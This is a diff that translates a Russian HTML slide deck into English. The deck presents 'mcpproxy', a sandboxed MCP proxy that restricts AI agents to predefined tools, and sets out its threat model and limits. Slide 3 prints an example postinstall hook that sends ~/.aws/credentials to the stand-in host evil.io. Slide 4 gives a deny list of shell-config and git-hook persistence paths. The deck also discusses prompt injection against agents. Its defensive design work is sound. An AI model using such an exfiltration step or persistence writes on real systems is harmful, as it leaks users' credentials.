@@ -1,4 +1,4 @@
-<title>Архитектура mcpproxy</title>
+<title>mcpproxy Architecture</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Archivo:wght@500;600;700&family=IBM+Plex+Mono:wght@400;500;600&family=IBM+Plex+Sans:wght@400;500;600&display=swap">
@@ -214,7 +214,7 @@ figcaption{font-size:12.5px; color:var(--muted); margin-top:10px; max-width:60ch
 @media (max-width:1000px){ .footer{padding:20px 24px 26px 76px} }
 </style>
 
-<nav class="rail" aria-label="Слайды">
+<nav class="rail" aria-label="Slides">
   <a href="#s1" data-dot="s1">1</a>
   <a href="#s2" data-dot="s2">2</a>
   <a href="#s3" data-dot="s3">3</a>
@@ -222,67 +222,67 @@ figcaption{font-size:12.5px; color:var(--muted); margin-top:10px; max-width:60ch
   <a href="#s5" data-dot="s5">5</a>
 </nav>
 
-<!-- ═══════════ 1 · проблема ═══════════ -->
+<!-- ═══════════ 1 · problem ═══════════ -->
 <section class="slide" id="s1">
   <div class="head">
     <div class="num">01</div>
     <div>
-      <p class="eyebrow">Проблема</p>
-      <h1>У агента есть shell — значит, у него есть всё</h1>
+      <p class="eyebrow">The problem</p>
+      <h1>If the agent has a shell, the agent has everything</h1>
     </div>
-    <div class="deck-mark"><b>mcpproxy</b><span>демо · архитектура</span></div>
+    <div class="deck-mark"><b>mcpproxy</b><span>demo · architecture</span></div>
   </div>
 
   <p class="thesis">
-    Модель говорит, <b>что</b> сделать. Прокси решает, <b>чем</b> это сделать.
-    ОС решает, <b>что запущенное может</b>. Человек видит всё три.
+    The model says <b>what</b> to do. The proxy decides <b>what runs</b>.
+    The OS decides <b>what the running code can touch</b>. The human sees all three.
   </p>
 
   <div class="body cols-2u">
     <div class="card">
-      <h3>Что даёт прямой терминал</h3>
+      <h3>What direct terminal access hands over</h3>
       <ul class="list">
-        <li><i>01</i><span><b>Инъекция команд</b> — произвольный текст доезжает до Bash</span></li>
-        <li><i>02</i><span><b>Несанкционированный доступ к файлам</b> — граница директории существует только на словах</span></li>
-        <li><i>03</i><span><b>Утечка секретов</b> — процесс наследует окружение целиком</span></li>
-        <li><i>04</i><span><b>Действия, продиктованные недоверенным контентом</b> — indirect prompt injection из логов, issue, README</span></li>
+        <li><i>01</i><span><b>Command injection</b> — arbitrary text reaches Bash</span></li>
+        <li><i>02</i><span><b>Unauthorized file access</b> — the directory boundary exists only in words</span></li>
+        <li><i>03</i><span><b>Secret leakage</b> — the process inherits the entire environment</span></li>
+        <li><i>04</i><span><b>Actions dictated by malicious content</b> — indirect prompt injection out of logs, issues, READMEs</span></li>
       </ul>
-      <p class="note">Прямой вызов скрипта не даёт ни песочницы, ни аудита, ни подтверждений.</p>
+      <p class="note">A direct script call gives you neither a sandbox, nor an audit trail, nor confirmations.</p>
     </div>
 
     <div class="stack">
       <div class="card flat">
-        <h3>Гипотеза</h3>
-        <p>Локальный MCP-прокси, который отдаёт модели <b>только предопределённые инструменты</b>
-        и валидирует их параметры, позволяет автоматизировать локальные задачи, не выдавая модели
-        произвольный shell. Никакого <code>execute_command</code>. Рецепт — это capability.</p>
+        <h3>The hypothesis</h3>
+        <p>A local MCP proxy that exposes to the model <b>only predefined tools</b> and validates their
+        parameters makes it possible to automate local tasks without giving the model an arbitrary shell.
+        No <code>execute_command</code>. The recipe is a capability.</p>
       </div>
       <div class="card flat">
-        <h3>В чём новизна — и в чём её нет</h3>
-        <p><b class="q">Неверно:</b> «новизна в том, что мы делаем allowlist бинарей и валидируем параметры».
-        Это уже сделано и лежит на GitHub.</p>
-        <p><b>Верно:</b> allowlist защищает от того, что модель <b>попросит запустить</b>.
-        Он ничего не делает против того, что запущенный код <b>сделает</b>.
-        Существующие решения останавливаются на первом. Мы делаем второе — и показываем это человеку.</p>
+        <h3>Where the novelty is — and where it isn't</h3>
+        <p><b class="q">Wrong:</b> "the novelty is that we allowlist binaries and validate parameters."
+        That's already been done and is on GitHub.</p>
+        <p><b>Right:</b> the argument allowlist protects against what the model <b>asks to run</b>.
+        It does nothing about what the code that runs <b>actually does</b>.
+        Existing solutions stop at the first. We do the second — and we show it to the human.</p>
       </div>
     </div>
   </div>
-  <p class="note">Источник: <code>docs/01-problem.md</code> · <code>docs/05-prior-art.md</code></p>
+  <p class="note">Sources: <code>docs/01-problem.md</code> · <code>docs/05-prior-art.md</code></p>
 </section>
 
-<!-- ═══════════ 2 · топология ═══════════ -->
+<!-- ═══════════ 2 · topology ═══════════ -->
 <section class="slide" id="s2">
   <div class="head">
     <div class="num">02</div>
     <div>
-      <p class="eyebrow">Топология</p>
-      <h2>Три части, потому что Electron не может быть хостом MCP-сервера</h2>
+      <p class="eyebrow">Topology</p>
+      <h2>Three components, because Electron cannot host the MCP server</h2>
     </div>
   </div>
 
   <div class="body cols-2u">
     <figure>
-      <svg viewBox="0 0 760 486" role="img" aria-label="Топология: MCP-клиент по stdio обращается к shim, shim по unix-сокету к демону mcpproxyd; демон отдаёт поток событий в Electron UI и получает вердикт по апруву, и спавнит дочерний процесс в песочнице без shell">
+      <svg viewBox="0 0 760 486" role="img" aria-label="Topology: the MCP client talks to the shim over stdio, the shim reaches the mcpproxyd daemon over a unix socket; the daemon streams events to the Electron UI and receives approval verdicts back, and spawns a child process inside the sandbox with no shell">
         <defs>
           <marker id="ar" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
             <path d="M0,0 L10,5 L0,10 z" fill="currentColor"/>
@@ -290,24 +290,24 @@ figcaption{font-size:12.5px; color:var(--muted); margin-top:10px; max-width:60ch
         </defs>
 
         <rect class="svg-box" x="70" y="16" width="260" height="50" rx="8" stroke-width="1.5"/>
-        <text class="svg-t" x="200" y="38" text-anchor="middle">MCP-клиент</text>
+        <text class="svg-t" x="200" y="38" text-anchor="middle">MCP client</text>
         <text class="svg-s" x="200" y="55" text-anchor="middle">Claude Code, Cursor, …</text>
 
         <rect class="svg-box" x="70" y="126" width="260" height="60" rx="8" stroke-width="1.5"/>
         <text class="svg-t" x="200" y="151" text-anchor="middle">mcpproxy-shim</text>
-        <text class="svg-s" x="200" y="169" text-anchor="middle">тонкий stdio-мост, ~200 строк</text>
+        <text class="svg-s" x="200" y="169" text-anchor="middle">thin stdio bridge, ~200 lines</text>
 
         <rect class="svg-core" x="70" y="266" width="260" height="50" rx="8" stroke-width="2"/>
         <text class="svg-t" x="200" y="288" text-anchor="middle">mcpproxyd</text>
-        <text class="svg-s" x="200" y="305" text-anchor="middle">ЯДРО · политика · аудит</text>
+        <text class="svg-s" x="200" y="305" text-anchor="middle">CORE · policy · audit</text>
 
         <rect class="svg-box" x="460" y="266" width="260" height="50" rx="8" stroke-width="1.5"/>
         <text class="svg-t" x="590" y="288" text-anchor="middle">Electron UI</text>
-        <text class="svg-s" x="590" y="305" text-anchor="middle">наблюдение · подтверждения</text>
+        <text class="svg-s" x="590" y="305" text-anchor="middle">observation · confirmations</text>
 
         <rect class="svg-box" x="70" y="396" width="260" height="60" rx="8" stroke-width="1.5"/>
-        <text class="svg-t" x="200" y="421" text-anchor="middle">Дочерний процесс</text>
-        <text class="svg-s" x="200" y="439" text-anchor="middle">в песочнице</text>
+        <text class="svg-t" x="200" y="421" text-anchor="middle">Child process</text>
+        <text class="svg-s" x="200" y="439" text-anchor="middle">in sandbox</text>
 
         <line class="svg-l" x1="200" y1="66" x2="200" y2="120" marker-end="url(#ar)"/>
         <line class="svg-l" x1="200" y1="186" x2="200" y2="260" marker-end="url(#ar)"/>
@@ -318,141 +318,143 @@ figcaption{font-size:12.5px; color:var(--muted); margin-top:10px; max-width:60ch
 
         <text class="svg-e" x="212" y="98">stdio / JSON-RPC</text>
         <text class="svg-e" x="212" y="217">unix socket 0600</text>
-        <text class="svg-e" x="212" y="233">+ каталог 0700 + токен</text>
+        <text class="svg-e" x="212" y="233">+ dir 0700 + token</text>
         <text class="svg-e" x="180" y="345">spawn(argv[])</text>
-        <text class="svg-e" x="180" y="361">без shell</text>
+        <text class="svg-e" x="180" y="361">no shell</text>
         <text class="svg-e" x="250" y="379">stdout / stderr</text>
         <text class="svg-e" x="250" y="395">+ sandbox violations</text>
-        <text class="svg-e" x="392" y="275">поток событий</text>
-        <text class="svg-e" x="392" y="319">вердикт по апруву</text>
+        <text class="svg-e" x="392" y="275">event stream</text>
+        <text class="svg-e" x="392" y="319">approval verdict</text>
       </svg>
-      <figcaption>Каноническая топология. Клиент требует stdio-subprocess — им становится дешёвый одноразовый shim;
-      вся политика живёт в одном демоне на все сессии.</figcaption>
+      <figcaption>The canonical topology. The client requires a stdio subprocess — that role goes to a cheap,
+      disposable shim; all policy lives in one daemon shared across sessions.</figcaption>
     </figure>
 
     <div class="stack">
       <div class="card">
-        <h3>Почему именно так — ADR-0001</h3>
+        <h3>Why it's built this way — ADR-0001</h3>
         <div class="tw"><table>
-          <thead><tr><th>Компонент</th><th>Почему отдельно</th></tr></thead>
+          <thead><tr><th>Component</th><th>Why separate</th></tr></thead>
           <tbody>
-            <tr><td class="rule"><code>shim</code></td><td>клиент требует stdio-subprocess; он обязан быть дешёвым и одноразовым</td></tr>
-            <tr><td class="rule"><code>mcpproxyd</code></td><td>одна точка истины на все сессии, переживает перезапуск клиента</td></tr>
-            <tr><td class="rule"><code>packages/core</code></td><td>вся логика демона как библиотека <b>без единого импорта Electron</b> — CI без дисплея</td></tr>
-            <tr><td class="rule"><code>desktop</code></td><td>подтверждения обязаны быть <b>вне контекста модели</b></td></tr>
+            <tr><td class="rule"><code>shim</code></td><td>the client requires a stdio subprocess; it must be cheap and disposable</td></tr>
+            <tr><td class="rule"><code>mcpproxyd</code></td><td>a single source of truth across all sessions; survives client restarts</td></tr>
+            <tr><td class="rule"><code>packages/core</code></td><td>all daemon logic as a library <b>with zero Electron imports</b> — CI without a display</td></tr>
+            <tr><td class="rule"><code>desktop</code></td><td>confirmations must happen <b>outside the model's context</b></td></tr>
           </tbody>
         </table></div>
-        <p class="note">Спавнить Electron на каждую сессию неприемлемо: множественные окна, тяжёлый старт, нет единого аудита.
-        Приложение не запущено — shim его поднимает; флаг <code>--require-ui</code> включает строгий fail-closed.</p>
+        <p class="note">Spawning Electron for every session would be unacceptable: multiple windows, heavy startup,
+        no unified audit trail. If the app isn't running, the shim starts it; <code>--require-ui</code> switches on
+        strict fail-closed mode.</p>
       </div>
 
       <div class="card flat">
-        <h3>Сокет — граница безопасности</h3>
+        <h3>The socket is a security boundary</h3>
         <ul class="list">
-          <li><i>И5</i><span>по IPC приходит <code>{recipeName, params, sessionId}</code> — <b>никогда argv и никогда путь к бинарю</b></span></li>
-          <li><i>И6</i><span>unix-сокет <code>0600</code> в каталоге <code>0700</code>, per-session токен вне конфига и вне argv shim'а</span></li>
+          <li><i>И5</i><span>over IPC the daemon receives <code>{recipeName, params, sessionId}</code> — <b>never argv, never a path to a binary</b></span></li>
+          <li><i>И6</i><span>a unix socket at <code>0600</code> inside a <code>0700</code> directory, a per-session token kept out of config and out of the shim's argv</span></li>
         </ul>
-        <p class="note">Спецификация MCP описывает атаку
-        <a class="lnk" href="https://modelcontextprotocol.io/specification/draft/basic/security_best_practices">«stdio Transport Security in Proxy Scenarios»</a>
-        буквально про эту архитектуру: прокси, который спавнит процессы, плюс украденный токен = RCE.
-        Полный контроль над сокетом даёт только вызов существующих рецептов с валидируемыми параметрами.</p>
-        <p class="note"><b class="warn">Честно:</b> проверки peer credentials <b>нет</b> — <code>LOCAL_PEERCRED</code>
-        недостижим из чистого Node (проба П11). Свойство «подключается только этот пользователь» держат
-        права каталога <code>0700</code>, которые ОС применяет при разрешении пути.</p>
+        <p class="note">The MCP specification describes an attack —
+        <a class="lnk" href="https://modelcontextprotocol.io/specification/draft/basic/security_best_practices">"stdio Transport Security in Proxy Scenarios"</a>
+        — that matches this architecture almost literally: a proxy that spawns processes, plus a stolen token = RCE.
+        Even full control of the socket only allows invoking existing recipes with validated parameters.</p>
+        <p class="note"><b class="warn">Stated plainly:</b> peer credentials are <b>not</b> verified —
+        <code>LOCAL_PEERCRED</code> is unreachable from plain Node (probe П11). The property "only this user's
+        processes can connect" is held instead by the <code>0700</code> directory, which the OS enforces during
+        path resolution.</p>
       </div>
     </div>
   </div>
 </section>
 
-<!-- ═══════════ 3 · две линии ═══════════ -->
+<!-- ═══════════ 3 · two lines ═══════════ -->
 <section class="slide" id="s3">
   <div class="head">
     <div class="num">03</div>
     <div>
-      <p class="eyebrow">Центральный тезис · кульминация демо</p>
-      <h2>Две линии обороны</h2>
+      <p class="eyebrow">The central claim · the headline act</p>
+      <h2>Two lines of defense</h2>
     </div>
   </div>
 
   <div class="lines">
     <div class="defline one">
-      <p class="who">Линия 1 — валидатор</p>
-      <p class="ctl">контролирует модель</p>
-      <p class="what">Что именно запускается</p>
-      <p class="how">argv · схемы параметров · realpath + confinement</p>
+      <p class="who">Line 1 — the validator</p>
+      <p class="ctl">controls the model</p>
+      <p class="what">What exactly gets launched</p>
+      <p class="how">argv · parameter schemas · realpath + confinement</p>
     </div>
-    <div class="joint">— argv собран →</div>
+    <div class="joint">— argv built →</div>
     <div class="defline two">
-      <p class="who">Линия 2 — песочница</p>
-      <p class="ctl">контролирует код</p>
-      <p class="what">Что запущенное может сделать</p>
-      <p class="how">ФС · сеть · лимиты · нарушения в таймлайн</p>
+      <p class="who">Line 2 — the sandbox</p>
+      <p class="ctl">controls the code</p>
+      <p class="what">What the launched code can do</p>
+      <p class="how">FS · network · limits · violations into the timeline</p>
     </div>
   </div>
 
   <div class="body cols-2u">
     <div class="card">
-      <h3>Цепочка, которую валидатор не видит</h3>
+      <h3>The chain the validator cannot see</h3>
       <pre>pnpm test
- └─ package.json из репо <span class="dim">(изменяем кем угодно)</span>
+ └─ package.json from the repo <span class="dim">(editable by anyone)</span>
      └─ vitest
-         └─ ~1200 пакетов из node_modules
+         └─ ~1200 packages from node_modules
              └─ <b>postinstall → fetch('https://evil.io',
                     body: ~/.aws/credentials)</b></pre>
-      <p class="note">Параметры валидны · бинарь в allowlist · директория правильная ·
-      <b class="warn">ключи утекли</b>. Валидатор отработал безупречно.
-      Утечку принёс код, который этот валидный вызов запустил — внутрь процесса валидатор не видит.</p>
+      <p class="note">Parameters valid · binary allowlisted · directory correct ·
+      <b class="warn">keys leaked</b>. The validator did its job flawlessly.
+      The leak came from the code that this valid call launched — the validator can't see inside the process.</p>
     </div>
 
     <div class="card">
-      <h3>Сценарий S5 — один вызов, два клика</h3>
+      <h3>Scenario S5 — one call, two clicks</h3>
       <div class="tw"><table>
-        <thead><tr><th>Режим</th><th>Тесты</th><th>Сеть</th><th>ФС</th></tr></thead>
+        <thead><tr><th>Mode</th><th>Tests</th><th>Network</th><th>Filesystem</th></tr></thead>
         <tbody>
           <tr>
             <td class="rule"><code>none</code></td>
-            <td>прошли ✅</td>
-            <td><span class="tag deny">🔴 evil.io:443 — 1.2 KB отправлено</span></td>
-            <td><span class="tag deny">🔴 ~/.aws/credentials прочитан</span></td>
+            <td>passed ✅</td>
+            <td><span class="tag deny">🔴 evil.io:443 — 1.2 KB sent</span></td>
+            <td><span class="tag deny">🔴 ~/.aws/credentials read</span></td>
           </tr>
           <tr>
             <td class="rule"><code>seatbelt</code></td>
-            <td>прошли ✅</td>
-            <td><span class="tag allow">🟢 denied, 0 байт</span></td>
+            <td>passed ✅</td>
+            <td><span class="tag allow">🟢 denied, 0 bytes</span></td>
             <td><span class="tag allow">🟢 denied</span></td>
           </tr>
         </tbody>
       </table></div>
-      <p class="note">Baseline <code>none</code> — <b>наблюдающий, а не слепой</b>: тот же HTTP/SOCKS5-прокси
-      отдаётся ребёнку через proxy-переменные, поэтому эксфильтрация видна и посчитана в байтах — просто не запрещена.
-      Это ожидаемая картина демо-сценария S5, а не результат замера: прогона red-team корпуса ещё не было.</p>
+      <p class="note">The <code>none</code> baseline is <b>observing, not blind</b>: the same HTTP/SOCKS5 proxy is
+      handed to the child via proxy env vars, so exfiltration is visible and counted in bytes — it's just not blocked.
+      This is the expected picture of demo scenario S5, not a measurement: the red-team corpus has not been run yet.</p>
     </div>
   </div>
 
   <div class="caveat">
-    <b class="lbl">Оговорка</b>
-    Фильтрация идёт <b>по доменам, а не по содержимому</b>. Замените <code>evil.io</code> на разрешённый
-    <code>api.github.com</code> — эксфильтрация в собственный gist атакующего пройдёт. Domain fronting тоже обходится.
-    Мы поднимаем стоимость атаки; мы не делаем её невозможной.
+    <b class="lbl">Caveat</b>
+    Filtering is <b>by domain, not by content</b>. Swap <code>evil.io</code> for an allowed
+    <code>api.github.com</code> and exfiltration into the attacker's own gist goes through. Domain fronting gets
+    around it too. We raise the cost of the attack; we don't make it impossible.
   </div>
-  <p class="note">За этим стоит: <code>03-threat-model.md</code> — две линии обороны · ADR-0002 (seatbelt через
-  <code>@anthropic-ai/sandbox-runtime</code>) · ADR-0007 (доменный allowlist) · атака A9 · OWASP ASI04 + ASI05 ·
-  класс подмены рецепта подтверждён CVE-2025-54136</p>
+  <p class="note">Backed by: <code>03-threat-model.md</code> — two lines of defense · ADR-0002 (seatbelt via
+  <code>@anthropic-ai/sandbox-runtime</code>) · ADR-0007 (domain allowlist) · attack A9 · OWASP ASI04 + ASI05 ·
+  recipe substitution confirmed as a real class by CVE-2025-54136</p>
 </section>
 
-<!-- ═══════════ 4 · механика ═══════════ -->
+<!-- ═══════════ 4 · mechanics ═══════════ -->
 <section class="slide" id="s4">
   <div class="head">
     <div class="num">04</div>
     <div>
-      <p class="eyebrow">Механика</p>
-      <h2>Путь вызова, инварианты, права</h2>
+      <p class="eyebrow">Mechanics</p>
+      <h2>Call path, invariants, permissions</h2>
     </div>
   </div>
 
   <div class="body cols-3">
     <div class="card">
-      <h3>Стадии вызова = события таймлайна</h3>
+      <h3>Call stages = timeline events</h3>
       <div class="stages">
         <span><em>01</em>received</span>
         <span><em>02</em>lock_check <em>· rug pull?</em></span>
@@ -460,7 +462,7 @@ figcaption{font-size:12.5px; color:var(--muted); margin-top:10px; max-width:60ch
         <span><em>04</em>resolve_paths</span>
         <span><em>05</em>build_argv</span>
         <span><em>06</em>classify_risk</span>
-        <span class="gate"><em>07</em>approval <em>· если high</em></span>
+        <span class="gate"><em>07</em>approval <em>· if high</em></span>
         <span><em>08</em>build_env</span>
         <span><em>09</em>build_profile</span>
         <span><em>10</em>spawn</span>
@@ -468,141 +470,141 @@ figcaption{font-size:12.5px; color:var(--muted); margin-top:10px; max-width:60ch
         <span><em>12</em>complete</span>
         <span class="opt"><em>13</em>violation <em>· 0..n</em></span>
       </div>
-      <p class="note">Видно, на каком шаге вызов остановился — эта пошаговость и делает демо наглядным.
-      Во frozen <code>stageOrder</code> тринадцать стадий; успешный вызов даёт двенадцать событий:
-      <code>violation</code> помечен как «может произойти много раз», и ноль — легальное число.
-      Стадия, до которой вызов не дошёл, не даёт события вовсе.</p>
+      <p class="note">You can see at which step the call stopped — that granularity is exactly what makes the demo
+      legible. The frozen <code>stageOrder</code> has thirteen stages; a successful call produces twelve events:
+      <code>violation</code> is marked "may occur many times", and zero is a legal count. A stage the call never
+      reached produces no event at all.</p>
     </div>
 
     <div class="card">
-      <h3>Инварианты — фиксируются в коде и тестах</h3>
+      <h3>Invariants — fixed in code and in tests</h3>
       <ul class="list">
-        <li><i>И1</i><span><b>Нет shell. Никогда.</b> Только <code>spawn(argv[])</code>. Строки команды не существует — инжектить не во что</span></li>
-        <li><i>И2</i><span>Параметры не склеиваются, а <b>занимают слоты argv</b></span></li>
-        <li><i>И3</i><span>Пути — <b>realpath + confinement</b>. Проверка «нет <code>..</code>» обходится симлинком за десять секунд</span></li>
-        <li><i>И4</i><span><b>Env-allowlist</b>: секрет не попадает в процесс. Редакция вывода — страховочная сетка, не основной механизм</span></li>
-        <li><i>И5</i><span>Демон принимает <b>имена рецептов</b>, а не команды</span></li>
-        <li><i>И6</i><span>IPC-сокет — граница безопасности</span></li>
-        <li><i>И7</i><span><b>Вывод скрипта — недоверенные данные</b>: маркер, скан, обрезка (OWASP ASI01)</span></li>
-        <li><i>И8</i><span>Electron IPC — тоже граница: <code>contextIsolation</code>, <code>sandbox</code>, жёсткий CSP</span></li>
+        <li><i>И1</i><span><b>No shell. Ever.</b> Only <code>spawn(argv[])</code>. There is no command string, so there's nothing to inject into</span></li>
+        <li><i>И2</i><span>Parameters aren't concatenated, they <b>occupy argv slots</b></span></li>
+        <li><i>И3</i><span>Paths — <b>realpath + confinement</b>. A "no <code>..</code>" check is bypassed with a symlink in ten seconds</span></li>
+        <li><i>И4</i><span><b>Env allowlist</b>: secrets never enter the process. Output redaction is a safety net, not the primary mechanism</span></li>
+        <li><i>И5</i><span>The daemon accepts <b>recipe names</b>, not commands</span></li>
+        <li><i>И6</i><span>The IPC socket is a security boundary</span></li>
+        <li><i>И7</i><span><b>Script output is untrusted data</b>: marked, scanned, truncated (OWASP ASI01)</span></li>
+        <li><i>И8</i><span>Electron IPC is a boundary too: <code>contextIsolation</code>, <code>sandbox</code>, a strict CSP</span></li>
       </ul>
     </div>
 
     <div class="stack">
       <div class="card">
-        <h3>Права песочницы — асимметричны</h3>
+        <h3>Sandbox permissions — asymmetric</h3>
         <div class="tw"><table>
-          <thead><tr><th>Операция</th><th>По умолчанию</th><th>Приоритет</th></tr></thead>
+          <thead><tr><th>Operation</th><th>Default</th><th>Priority</th></tr></thead>
           <tbody>
-            <tr><td>Чтение</td><td><span class="tag allow">разрешено</span></td><td class="rule"><code>allowRead</code> бьёт <code>denyRead</code></td></tr>
-            <tr><td>Запись</td><td><span class="tag deny">запрещено</span></td><td class="rule"><code>denyWrite</code> бьёт <code>allowWrite</code></td></tr>
-            <tr><td>Сеть</td><td><span class="tag deny">запрещена</span></td><td class="rule">доменный allowlist через прокси</td></tr>
+            <tr><td>Read</td><td><span class="tag allow">allowed</span></td><td class="rule"><code>allowRead</code> beats <code>denyRead</code></td></tr>
+            <tr><td>Write</td><td><span class="tag deny">denied</span></td><td class="rule"><code>denyWrite</code> beats <code>allowWrite</code></td></tr>
+            <tr><td>Network</td><td><span class="tag deny">denied</span></td><td class="rule">domain allowlist via proxy</td></tr>
           </tbody>
         </table></div>
-        <p class="note"><b>Mandatory deny</b> — не снимается даже явным allow:
+        <p class="note"><b>Mandatory deny</b> — cannot be lifted even by an explicit allow:
         <code>.bashrc</code> <code>.zshrc</code> <code>.profile</code> <code>.gitconfig</code> <code>.git/hooks/</code>
         <code>.vscode/</code> <code>.idea/</code> <code>.claude/commands/</code>.
-        Это persistence-векторы: запись туда даёт исполнение позже, уже вне песочницы.</p>
+        These are persistence vectors: writing there enables code execution later, already outside the sandbox.</p>
       </div>
       <div class="card flat">
-        <h3>Аудит — hash-chain</h3>
+        <h3>Audit — hash chain</h3>
         <pre class="tight">self = sha256(utf8(
   canonicalizeJcs({ prev, event })))</pre>
-        <p class="note">Хэшируется <b>всё событие целиком</b> вместе со ссылкой на предыдущую запись —
-        перечисление полей было бы дырой. Проверяется не только дайджест, но и связь:
-        <code>prev</code> каждой записи обязан совпадать с <code>self</code> предыдущей.</p>
-        <p class="note"><b class="warn">Чего цепочка не ловит:</b> обрезание хвоста лога — удалив последние записи
-        целиком, атакующий оставляет цепочку согласованной. Нужен внешний якорь.</p>
+        <p class="note"><b>The entire event</b> is hashed together with the reference to the previous entry —
+        enumerating fields would be a hole. Not only the digest is verified but the linkage:
+        each entry's <code>prev</code> must match the previous entry's <code>self</code>.</p>
+        <p class="note"><b class="warn">What the chain doesn't catch:</b> truncating the tail of the log — deleting
+        the last entries entirely leaves the chain consistent. That needs an external anchor.</p>
       </div>
     </div>
   </div>
 </section>
 
-<!-- ═══════════ 5 · границы ═══════════ -->
+<!-- ═══════════ 5 · limits ═══════════ -->
 <section class="slide" id="s5">
   <div class="head">
     <div class="num">05</div>
     <div>
-      <p class="eyebrow">Честные границы</p>
-      <h2>Где мы сильны, где частично и где нас нет</h2>
+      <p class="eyebrow">Honest limitations</p>
+      <h2>What holds, what partly holds, and what we don't cover</h2>
     </div>
   </div>
 
   <div class="body cols-3">
     <div class="card">
-      <h3><span class="tag allow">●</span> Защищаем хорошо</h3>
+      <h3><span class="tag allow">●</span> Protected well</h3>
       <ul class="list">
-        <li><i>—</i><span>Инъекция через параметры — <b>структурная</b> защита, строки команды не существует</span></li>
-        <li><i>—</i><span>Выход за границы директорий — две независимые линии</span></li>
-        <li><i>—</i><span>Утечка секретов из окружения — защита на входе, а не фильтр на выходе</span></li>
-        <li><i>—</i><span>Эксфильтрация в неразрешённый домен — deny-by-default на всё дерево процессов</span></li>
-        <li><i>—</i><span>Persistence через shell-конфиги и git-hooks — неснимаемый deny</span></li>
-        <li><i>—</i><span>Тихая подмена рецепта — lock-файл + diff-approve</span></li>
-        <li><i>—</i><span>Подделка подтверждения — out-of-band канал вне контекста модели</span></li>
+        <li><i>—</i><span>Injection via parameters — <b>structural</b> protection, no command string exists</span></li>
+        <li><i>—</i><span>Escaping directory boundaries — two independent lines</span></li>
+        <li><i>—</i><span>Secret leakage from the environment — protection at the entry point, not filtering at the exit</span></li>
+        <li><i>—</i><span>Exfiltration to a disallowed domain — deny-by-default across the whole process tree</span></li>
+        <li><i>—</i><span>Persistence via shell configs and git hooks — non-removable deny</span></li>
+        <li><i>—</i><span>Silent recipe substitution — lock file + diff-approve</span></li>
+        <li><i>—</i><span>Forged confirmation — an out-of-band channel outside the model's context</span></li>
       </ul>
     </div>
 
     <div class="card">
-      <h3><span class="tag warn">◐</span> Защищаем частично</h3>
+      <h3><span class="tag warn">◐</span> Protected partially</h3>
       <ul class="list">
-        <li><i>—</i><span><b>Разрешённый домен</b>: фильтруем по домену, не по содержимому</span></li>
-        <li><i>—</i><span><b>Indirect prompt injection в выводе</b>: помечен, отсканирован, обрезан — но модель его всё равно читает. Уменьшаем вероятность, не устраняем класс</span></li>
-        <li><i>—</i><span><b>Редакция секретов</b>: энтропия ловит 1 % токенов длиной 23 символа, 29 % — 28, 98 % — 40. Для hex порога не существует вовсе: ключ Twilio (p50 3.62) и git sha (3.70) неотличимы</span></li>
-        <li><i>—</i><span><b>ReDoS</b>: RE2 закрывает демон, но строка <code>pattern</code> уезжает MCP-клиенту в <code>inputSchema</code>, а его движок бэктрекает</span></li>
-        <li><i>—</i><span><b>Учётные данные пира сокета</b> не проверяем — свойство держат права каталога <code>0700</code></span></li>
-        <li><i>—</i><span><b>Усталость от подтверждений</b>: если high-risk станет частым, человек начнёт нажимать не глядя</span></li>
+        <li><i>—</i><span><b>An allowed domain</b>: we filter by domain, not by content</span></li>
+        <li><i>—</i><span><b>Indirect prompt injection in output</b>: marked, scanned, truncated — but the model still reads it. We reduce the probability; we don't eliminate the class</span></li>
+        <li><i>—</i><span><b>Secret redaction</b>: entropy catches 1% of tokens 23 characters long, 29% at 28, 98% at 40. For hex there is no threshold at all: a Twilio key (p50 3.62) and a git sha (3.70) are indistinguishable</span></li>
+        <li><i>—</i><span><b>ReDoS</b>: RE2 closes the daemon, but the <code>pattern</code> string travels to the MCP client inside <code>inputSchema</code>, and that engine backtracks</span></li>
+        <li><i>—</i><span><b>Socket peer credentials</b> are not verified — the property is held by <code>0700</code> directory permissions</span></li>
+        <li><i>—</i><span><b>Confirmation fatigue</b>: if high-risk operations become frequent, a human starts clicking through without looking</span></li>
       </ul>
     </div>
 
     <div class="card">
-      <h3><span class="tag deny">○</span> Не защищаем вообще</h3>
+      <h3><span class="tag deny">○</span> Not protected at all</h3>
       <ul class="list">
-        <li><i>—</i><span><b>Злонамеренного пользователя</b> — это его машина</span></li>
-        <li><i>—</i><span><b>Ядро macOS и сам <code>sandbox-exec</code></b> — Apple формально считает его deprecated</span></li>
-        <li><i>—</i><span><b>Саму модель</b> — влияем только на то, что она физически может вызвать</span></li>
-        <li><i>—</i><span><b>Провенанс пакетов</b> — ловим поведение в рантайме, подписи не проверяем</span></li>
-        <li><i>—</i><span><b>Tamper-proof аудит</b> — наш лог tamper-<b>evident</b></span></li>
-        <li><i>—</i><span><b>Корпоративные сценарии</b> — RBAC и SSO это задача MCP-гейтвеев</span></li>
+        <li><i>—</i><span><b>A malicious user</b> — it's their machine</span></li>
+        <li><i>—</i><span><b>The macOS kernel and <code>sandbox-exec</code> itself</b> — Apple formally considers it deprecated</span></li>
+        <li><i>—</i><span><b>The model itself</b> — we affect only what it can physically invoke</span></li>
+        <li><i>—</i><span><b>Package provenance</b> — we catch runtime behavior, we don't verify signatures</span></li>
+        <li><i>—</i><span><b>Tamper-proof audit</b> — our log is tamper-<b>evident</b></span></li>
+        <li><i>—</i><span><b>Enterprise scenarios</b> — RBAC and SSO are the job of MCP gateways</span></li>
       </ul>
-      <p class="note"><b>Статус среза:</b></p>
+      <p class="note"><b>Status of this slice:</b></p>
       <div class="chips">
-        <span class="tag allow">seatbelt — основная</span>
+        <span class="tag allow">seatbelt — primary</span>
         <span class="tag allow">none — baseline</span>
-        <span class="tag plain">container — заглушка</span>
-        <span class="tag plain">Windows / Linux — не реализованы</span>
-        <span class="tag plain">Merkle-корень — вне среза</span>
+        <span class="tag plain">container — stub</span>
+        <span class="tag plain">Windows / Linux — not implemented</span>
+        <span class="tag plain">Merkle root — out of scope</span>
       </div>
     </div>
   </div>
 
   <div class="body cols-2u">
     <div class="card marked">
-      <h3>Формулировка для сцены</h3>
-      <p class="thesis sm">Мы не решаем prompt injection. Мы сводим поверхность к нулю там, где раньше был shell,
-      и делаем всё остальное видимым.</p>
-      <p class="thesis sm">Мы не делаем атаку невозможной. Мы поднимаем её стоимость и гарантируем,
-      что она оставит след.</p>
+      <h3>Framing for the stage</h3>
